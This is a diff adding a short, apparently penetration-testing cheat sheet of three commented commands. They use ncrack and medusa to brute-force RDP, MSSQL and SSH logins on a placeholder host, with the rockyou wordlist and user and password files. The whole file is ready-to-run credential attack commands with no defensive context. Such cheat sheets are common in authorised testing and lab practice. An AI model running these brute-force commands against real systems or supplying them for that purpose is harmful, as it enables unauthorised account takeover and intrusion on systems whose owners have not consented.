@@ -1,0 +1,8 @@
+# Bruteforce RDP using wordlist
+ncrack -vv --user root -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10 -oN ncrack.txt
+
+# Bruteforce MSSQL using wordlist
+medusa -h 10.10.10.10 -U users.txt -P /usr/share/wordlists/rockyou.txt -M mssql -n 1433 -O medusa.txt
+
+# Bruteforce SSH using wordlist
+medusa -H hosts_ssh.txt -U users.txt -P passwords.txt -M ssh -t 1 -T 5 -O medusa_ssh.txt
